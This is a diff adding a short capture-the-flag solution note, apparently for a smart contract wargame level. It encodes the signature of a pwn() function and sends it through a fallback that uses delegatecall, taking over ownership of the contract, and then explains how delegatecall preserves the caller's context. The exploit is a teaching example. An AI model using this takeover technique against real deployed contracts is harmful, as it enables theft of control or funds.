@@ -1,0 +1,11 @@
+Solution:
+First, Encode the function signature that gets passed as msg.data:
+signature = web3.eth.abi.encodeFunctionSignature("pwn()")
+Call our fallback function which does delegatecall():
+await sendTransaction({from:player, to:contract.address, data:signature })
+
+Other Notes:
+-With delegatecall(), msg.sender, msg.value, and address(this), doesn't change.
+-With delegatecall(), it loads function code of another contract and executes
+it like it was in its scope.
+
